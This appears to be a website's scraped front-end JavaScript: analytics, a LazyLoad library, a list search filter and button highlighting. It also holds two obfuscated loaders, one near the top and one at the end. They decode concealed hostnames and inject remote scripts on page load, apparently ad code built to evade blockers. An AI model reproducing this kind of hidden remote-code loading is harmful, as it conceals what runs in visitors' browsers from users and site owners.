(function (html) {
  html.className = html.className.replace(/\bno-js\b/, "js");
})(document.documentElement);
(function () {
  setTimeout(function () {
    if (!window["s2ss317"]) {
      let e = document.querySelector('script[did="bkW5h"]'),
        t =
          !!e.hasAttribute("admc") &&
          (function (e) {
            let t = atob(e).replace(/[a-zA-Z]/g, function (e) {
              var t = e <= "Z" ? 65 : 97;
              return String.fromCharCode(t + ((e.charCodeAt(0) - t + 13) % 26));
            });
            return t.replaceAll("_", ".");
          })(e.getAttribute("admc")),
        r = e.getAttribute("src"),
        a = e.parentElement,
        c = document.createElement("script");
      !(function (e, t) {
        let r,
          a = ["did", "admc", "src"],
          c = Array.prototype.slice.call(t.attributes);
        for (; (r = c.pop()); )
          -1 === a.indexOf(r.nodeName) &&
            e.setAttribute(r.nodeName, r.nodeValue);
      })(c, e),
        (c.src = ((d = r), "//" + t + d.replace(/^.*\/\/[^\/]+/, ""))),
        c.setAttribute("sadbl", 1),
        a.removeChild(e),
        a.appendChild(c);
    }
    var d;
  }, 150);
  document.body.addEventListener("click", function (e) {
    window["s2ss317ff"] instanceof Function && window["s2ss317ff"](e);
  });
})();
window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
gtag("js", new Date());
gtag("config", "UA-146367293-2");
!(function (n, t) {
  "object" == typeof exports && "undefined" != typeof module
    ? (module.exports = t())
    : "function" == typeof define && define.amd
    ? define(t)
    : ((n =
        "undefined" != typeof globalThis ? globalThis : n || self).LazyLoad =
        t());
})(this, function () {
  "use strict";
  function n() {
    return (
      (n =
        Object.assign ||
        function (n) {
          for (var t = 1; t < arguments.length; t++) {
            var e = arguments[t];
            for (var i in e)
              Object.prototype.hasOwnProperty.call(e, i) && (n[i] = e[i]);
          }
          return n;
        }),
      n.apply(this, arguments)
    );
  }
  var t = "undefined" != typeof window,
    e =
      (t && !("onscroll" in window)) ||
      ("undefined" != typeof navigator &&
        /(gle|ing|ro)bot|crawl|spider/i.test(navigator.userAgent)),
    i = t && "IntersectionObserver" in window,
    o = t && "classList" in document.createElement("p"),
    a = t && window.devicePixelRatio > 1,
    r = {
      elements_selector: ".lazy",
      container: e || t ? document : null,
      threshold: 300,
      thresholds: null,
      data_src: "src",
      data_srcset: "srcset",
      data_sizes: "sizes",
      data_bg: "bg",
      data_bg_hidpi: "bg-hidpi",
      data_bg_multi: "bg-multi",
      data_bg_multi_hidpi: "bg-multi-hidpi",
      data_poster: "poster",
      class_applied: "applied",
      class_loading: "loading",
      class_loaded: "loaded",
      class_error: "error",
      class_entered: "entered",
      class_exited: "exited",
      unobserve_completed: !0,
      unobserve_entered: !1,
      cancel_on_exit: !0,
      callback_enter: null,
      callback_exit: null,
      callback_applied: null,
      callback_loading: null,
      callback_loaded: null,
      callback_error: null,
      callback_finish: null,
      callback_cancel: null,
      use_native: !1,
    },
    c = function (t) {
      return n({}, r, t);
    },
    u = function (n, t) {
      var e,
        i = "LazyLoad::Initialized",
        o = new n(t);
      try {
        e = new CustomEvent(i, { detail: { instance: o } });
      } catch (n) {
        (e = document.createEvent("CustomEvent")).initCustomEvent(i, !1, !1, {
          instance: o,
        });
      }
      window.dispatchEvent(e);
    },
    l = "src",
    s = "srcset",
    f = "sizes",
    d = "poster",
    _ = "llOriginalAttrs",
    g = "loading",
    v = "loaded",
    b = "applied",
    p = "error",
    h = "native",
    m = "data-",
    E = "ll-status",
    I = function (n, t) {
      return n.getAttribute(m + t);
    },
    y = function (n) {
      return I(n, E);
    },
    A = function (n, t) {
      return (function (n, t, e) {
        var i = "data-ll-status";
        null !== e ? n.setAttribute(i, e) : n.removeAttribute(i);
      })(n, 0, t);
    },
    k = function (n) {
      return A(n, null);
    },
    L = function (n) {
      return null === y(n);
    },
    w = function (n) {
      return y(n) === h;
    },
    x = [g, v, b, p],
    O = function (n, t, e, i) {
      n && (void 0 === i ? (void 0 === e ? n(t) : n(t, e)) : n(t, e, i));
    },
    N = function (n, t) {
      o ? n.classList.add(t) : (n.className += (n.className ? " " : "") + t);
    },
    C = function (n, t) {
      o
        ? n.classList.remove(t)
        : (n.className = n.className
            .replace(new RegExp("(^|\\s+)" + t + "(\\s+|$)"), " ")
            .replace(/^\s+/, "")
            .replace(/\s+$/, ""));
    },
    M = function (n) {
      return n.llTempImage;
    },
    z = function (n, t) {
      if (t) {
        var e = t._observer;
        e && e.unobserve(n);
      }
    },
    R = function (n, t) {
      n && (n.loadingCount += t);
    },
    T = function (n, t) {
      n && (n.toLoadCount = t);
    },
    G = function (n) {
      for (var t, e = [], i = 0; (t = n.children[i]); i += 1)
        "SOURCE" === t.tagName && e.push(t);
      return e;
    },
    D = function (n, t) {
      var e = n.parentNode;
      e && "PICTURE" === e.tagName && G(e).forEach(t);
    },
    V = function (n, t) {
      G(n).forEach(t);
    },
    F = [l],
    j = [l, d],
    P = [l, s, f],
    S = function (n) {
      return !!n[_];
    },
    U = function (n) {
      return n[_];
    },
    $ = function (n) {
      return delete n[_];
    },
    q = function (n, t) {
      if (!S(n)) {
        var e = {};
        t.forEach(function (t) {
          e[t] = n.getAttribute(t);
        }),
          (n[_] = e);
      }
    },
    H = function (n, t) {
      if (S(n)) {
        var e = U(n);
        t.forEach(function (t) {
          !(function (n, t, e) {
            e ? n.setAttribute(t, e) : n.removeAttribute(t);
          })(n, t, e[t]);
        });
      }
    },
    B = function (n, t, e) {
      N(n, t.class_loading),
        A(n, g),
        e && (R(e, 1), O(t.callback_loading, n, e));
    },
    J = function (n, t, e) {
      e && n.setAttribute(t, e);
    },
    K = function (n, t) {
      J(n, f, I(n, t.data_sizes)),
        J(n, s, I(n, t.data_srcset)),
        J(n, l, I(n, t.data_src));
    },
    Q = {
      IMG: function (n, t) {
        D(n, function (n) {
          q(n, P), K(n, t);
        }),
          q(n, P),
          K(n, t);
      },
      IFRAME: function (n, t) {
        q(n, F), J(n, l, I(n, t.data_src));
      },
      VIDEO: function (n, t) {
        V(n, function (n) {
          q(n, F), J(n, l, I(n, t.data_src));
        }),
          q(n, j),
          J(n, d, I(n, t.data_poster)),
          J(n, l, I(n, t.data_src)),
          n.load();
      },
    },
    W = ["IMG", "IFRAME", "VIDEO"],
    X = function (n, t) {
      !t ||
        (function (n) {
          return n.loadingCount > 0;
        })(t) ||
        (function (n) {
          return n.toLoadCount > 0;
        })(t) ||
        O(n.callback_finish, t);
    },
    Y = function (n, t, e) {
      n.addEventListener(t, e), (n.llEvLisnrs[t] = e);
    },
    Z = function (n, t, e) {
      n.removeEventListener(t, e);
    },
    nn = function (n) {
      return !!n.llEvLisnrs;
    },
    tn = function (n) {
      if (nn(n)) {
        var t = n.llEvLisnrs;
        for (var e in t) {
          var i = t[e];
          Z(n, e, i);
        }
        delete n.llEvLisnrs;
      }
    },
    en = function (n, t, e) {
      !(function (n) {
        delete n.llTempImage;
      })(n),
        R(e, -1),
        (function (n) {
          n && (n.toLoadCount -= 1);
        })(e),
        C(n, t.class_loading),
        t.unobserve_completed && z(n, e);
    },
    on = function (n, t, e) {
      var i = M(n) || n;
      nn(i) ||
        (function (n, t, e) {
          nn(n) || (n.llEvLisnrs = {});
          var i = "VIDEO" === n.tagName ? "loadeddata" : "load";
          Y(n, i, t), Y(n, "error", e);
        })(
          i,
          function (o) {
            !(function (n, t, e, i) {
              var o = w(t);
              en(t, e, i),
                N(t, e.class_loaded),
                A(t, v),
                O(e.callback_loaded, t, i),
                o || X(e, i);
            })(0, n, t, e),
              tn(i);
          },
          function (o) {
            !(function (n, t, e, i) {
              var o = w(t);
              en(t, e, i),
                N(t, e.class_error),
                A(t, p),
                O(e.callback_error, t, i),
                o || X(e, i);
            })(0, n, t, e),
              tn(i);
          }
        );
    },
    an = function (n, t, e) {
      !(function (n) {
        n.llTempImage = document.createElement("IMG");
      })(n),
        on(n, t, e),
        (function (n) {
          S(n) || (n[_] = { backgroundImage: n.style.backgroundImage });
        })(n),
        (function (n, t, e) {
          var i = I(n, t.data_bg),
            o = I(n, t.data_bg_hidpi),
            r = a && o ? o : i;
          r &&
            ((n.style.backgroundImage = 'url("'.concat(r, '")')),
            M(n).setAttribute(l, r),
            B(n, t, e));
        })(n, t, e),
        (function (n, t, e) {
          var i = I(n, t.data_bg_multi),
            o = I(n, t.data_bg_multi_hidpi),
            r = a && o ? o : i;
          r &&
            ((n.style.backgroundImage = r),
            (function (n, t, e) {
              N(n, t.class_applied),
                A(n, b),
                e &&
                  (t.unobserve_completed && z(n, t),
                  O(t.callback_applied, n, e));
            })(n, t, e));
        })(n, t, e);
    },
    rn = function (n, t, e) {
      !(function (n) {
        return W.indexOf(n.tagName) > -1;
      })(n)
        ? an(n, t, e)
        : (function (n, t, e) {
            on(n, t, e),
              (function (n, t, e) {
                var i = Q[n.tagName];
                i && (i(n, t), B(n, t, e));
              })(n, t, e);
          })(n, t, e);
    },
    cn = function (n) {
      n.removeAttribute(l), n.removeAttribute(s), n.removeAttribute(f);
    },
    un = function (n) {
      D(n, function (n) {
        H(n, P);
      }),
        H(n, P);
    },
    ln = {
      IMG: un,
      IFRAME: function (n) {
        H(n, F);
      },
      VIDEO: function (n) {
        V(n, function (n) {
          H(n, F);
        }),
          H(n, j),
          n.load();
      },
    },
    sn = function (n, t) {
      (function (n) {
        var t = ln[n.tagName];
        t
          ? t(n)
          : (function (n) {
              if (S(n)) {
                var t = U(n);
                n.style.backgroundImage = t.backgroundImage;
              }
            })(n);
      })(n),
        (function (n, t) {
          L(n) ||
            w(n) ||
            (C(n, t.class_entered),
            C(n, t.class_exited),
            C(n, t.class_applied),
            C(n, t.class_loading),
            C(n, t.class_loaded),
            C(n, t.class_error));
        })(n, t),
        k(n),
        $(n);
    },
    fn = ["IMG", "IFRAME", "VIDEO"],
    dn = function (n) {
      return n.use_native && "loading" in HTMLImageElement.prototype;
    },
    _n = function (n, t, e) {
      n.forEach(function (n) {
        return (function (n) {
          return n.isIntersecting || n.intersectionRatio > 0;
        })(n)
          ? (function (n, t, e, i) {
              var o = (function (n) {
                return x.indexOf(y(n)) >= 0;
              })(n);
              A(n, "entered"),
                N(n, e.class_entered),
                C(n, e.class_exited),
                (function (n, t, e) {
                  t.unobserve_entered && z(n, e);
                })(n, e, i),
                O(e.callback_enter, n, t, i),
                o || rn(n, e, i);
            })(n.target, n, t, e)
          : (function (n, t, e, i) {
              L(n) ||
                (N(n, e.class_exited),
                (function (n, t, e, i) {
                  e.cancel_on_exit &&
                    (function (n) {
                      return y(n) === g;
                    })(n) &&
                    "IMG" === n.tagName &&
                    (tn(n),
                    (function (n) {
                      D(n, function (n) {
                        cn(n);
                      }),
                        cn(n);
                    })(n),
                    un(n),
                    C(n, e.class_loading),
                    R(i, -1),
                    k(n),
                    O(e.callback_cancel, n, t, i));
                })(n, t, e, i),
                O(e.callback_exit, n, t, i));
            })(n.target, n, t, e);
      });
    },
    gn = function (n) {
      return Array.prototype.slice.call(n);
    },
    vn = function (n) {
      return n.container.querySelectorAll(n.elements_selector);
    },
    bn = function (n) {
      return (function (n) {
        return y(n) === p;
      })(n);
    },
    pn = function (n, t) {
      return (function (n) {
        return gn(n).filter(L);
      })(n || vn(t));
    },
    hn = function (n, e) {
      var o = c(n);
      (this._settings = o),
        (this.loadingCount = 0),
        (function (n, t) {
          i &&
            !dn(n) &&
            (t._observer = new IntersectionObserver(
              function (e) {
                _n(e, n, t);
              },
              (function (n) {
                return {
                  root: n.container === document ? null : n.container,
                  rootMargin: n.thresholds || n.threshold + "px",
                };
              })(n)
            ));
        })(o, this),
        (function (n, e) {
          t &&
            window.addEventListener("online", function () {
              !(function (n, t) {
                var e;
                ((e = vn(n)), gn(e).filter(bn)).forEach(function (t) {
                  C(t, n.class_error), k(t);
                }),
                  t.update();
              })(n, e);
            });
        })(o, this),
        this.update(e);
    };
  return (
    (hn.prototype = {
      update: function (n) {
        var t,
          o,
          a = this._settings,
          r = pn(n, a);
        T(this, r.length),
          !e && i
            ? dn(a)
              ? (function (n, t, e) {
                  n.forEach(function (n) {
                    -1 !== fn.indexOf(n.tagName) &&
                      (function (n, t, e) {
                        n.setAttribute("loading", "lazy"),
                          on(n, t, e),
                          (function (n, t) {
                            var e = Q[n.tagName];
                            e && e(n, t);
                          })(n, t),
                          A(n, h);
                      })(n, t, e);
                  }),
                    T(e, 0);
                })(r, a, this)
              : ((o = r),
                (function (n) {
                  n.disconnect();
                })((t = this._observer)),
                (function (n, t) {
                  t.forEach(function (t) {
                    n.observe(t);
                  });
                })(t, o))
            : this.loadAll(r);
      },
      destroy: function () {
        this._observer && this._observer.disconnect(),
          vn(this._settings).forEach(function (n) {
            $(n);
          }),
          delete this._observer,
          delete this._settings,
          delete this.loadingCount,
          delete this.toLoadCount;
      },
      loadAll: function (n) {
        var t = this,
          e = this._settings;
        pn(n, e).forEach(function (n) {
          z(n, t), rn(n, e, t);
        });
      },
      restoreAll: function () {
        var n = this._settings;
        vn(n).forEach(function (t) {
          sn(t, n);
        });
      },
    }),
    (hn.load = function (n, t) {
      var e = c(t);
      rn(n, e);
    }),
    (hn.resetStatus = function (n) {
      k(n);
    }),
    t &&
      (function (n, t) {
        if (t)
          if (t.length) for (var e, i = 0; (e = t[i]); i += 1) u(n, e);
          else u(n, t);
      })(hn, window.lazyLoadOptions),
    hn
  );
});
new LazyLoad();



       

function myFunction() {
    var input, filter, ul, li, a, i, txtValue;
    input = document.getElementById("myInput");
    filter = input.value.toUpperCase();
    ul = document.getElementById("myUL");
    li = ul.getElementsByTagName("li");
    for (i = 0; i < li.length; i++) {
        a = li[i].getElementsByTagName("a")[0];
        txtValue = a.textContent || a.innerText;
        if (txtValue.toUpperCase().indexOf(filter) > -1) {
            li[i].style.display = "";
        } else {
            li[i].style.display = "none";
        }
    }
}


// Add active class to the current button (highlight it)
var header = document.getElementById("myDIV");
var btns = header.getElementsByClassName("btn");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function() {
  var current = document.getElementsByClassName("active");
  if (current.length > 0) { 
    current[0].className = current[0].className.replace(" active", "");
  }
  this.className += " active";
  });
}



/*<![CDATA[/* */
(function(){var e2974fbcc0efb4af56e00fb0b3bb0501="EShSqc2h9i7JnXfEjLSF89NktN3ZzM9G96RnKCIA9Sft6xxzztzoprxCMDyuyoKFNbIpaoHSc-B1bFx1q-YW2kCaySOfCWw";var a=['asK3w6tucwl7d8OZw6s4','P8KWw4HCp8OAw7I=','wqfCj8KhU8Oq','LUHCpw7Dt8K9cQ==','GcKWHw==','N8OIA8O0TcOjGsKtw7t/HsOpwrpcwoLDpTvCuBfCmw==','YcOiw4rCjGRow6QhEw==','w57DpxvCmsOnG287','El/DkXnCuGV8PMO9MC8TbTYwYAzCqcKPeGYew5HDp1LCl8OL','wo7Du0VLfUXCo8OfwrEZwpp3w611woHDujrCr8O+wrLDjHDCtcOoI8K6M1PCmMKvw6MKwrvCjQ3Cm8OXw6E=','LMOOw43DtMOewpLCh8KSw5DDjHV2','w6ofEzHDgcKnwodXw4xLBsOOecKO','wqDCt8KmwoxJH8KDwq4iBMKlQMKV','D8KuwrLDh8KQAlFE','fz8Vw6rCv8ORwrs=','wqLCmcK0XMOweHXCiMKcwprDn2Y=','V8Osw5sxIMOzQ0FFOcOtwqvDpcKRw7jCplo/wp7DlmlDC2A=','e0nDosOLwqVH','J8Kjw7fDvw==','W8Kvw4AJBBZ6FCJCWsK9','w75CCXTCm8OxwoFPwo4vUcKNR8K3NsKnwpEnZBEse8O/VDAYw7t3AARoO8Oyw5LCqWMNwoVEEntfw5rCj8KTwpDCino=','ecOZShAwFlw=','JFZbIMObShfCljnCnnnDiBE=','B07DvHJEwr0=','NcOBw4zDtMOCwpLCi8KYw5LDhg==','wpkAHsKOXcK7','w5oOwpABJ8OHw7Mu','BMKjworDjg==','HMKSXcO1wocJwqTDv3jDkiDDskRLFQ=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x1b3));var b=function(c,d){c=c-0x0;var e=a[c];if(b['JscWtr']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['LnSpER']=g;b['aBqoLQ']={};b['JscWtr']=!![];}var f=b['aBqoLQ'][c];if(f===undefined){if(b['XuUsOb']===undefined){b['XuUsOb']=!![];}e=b['LnSpER'](e,d);b['aBqoLQ'][c]=e;}else{e=f;}return e;};var i=window;i[b('0x12','qp3E')]=[[b('0x1','i0q5'),0x48b59d],[b('0x11','rNba'),0.005],[b('0xb','XWc1'),b('0x3','(lu%')],[b('0xf','vFa4'),0x0],[b('0xe','tI%@'),![]],[b('0x16','h($W'),0x0],[b('0x13','!Nqr'),!0x0]];var w=[b('0x9','N*t1'),b('0x14','XWc1'),b('0x10','sMiH'),b('0x8',']A&#')],k=0x0,r,v=function(){if(!w[k])return;r=i[b('0x1a','VnWw')][b('0xc','h2#i')](b('0x17','AxrC'));r[b('0x1b','*XfX')]=b('0x1c','3jv[');r[b('0x2','vFa4')]=!0x0;var c=i[b('0x7','qJHC')][b('0x5','ZRv1')](b('0x19','[K9w'))[0x0];r[b('0x4','dILN')]=b('0xd','I@]D')+w[k];r[b('0x0','3fVJ')]=b('0x6','vv53');r[b('0x15','Uzd*')]=function(){k++;v();};c[b('0x18','&^QK')][b('0xa','&^QK')](r,c);};v();})();
/*]]>/* */

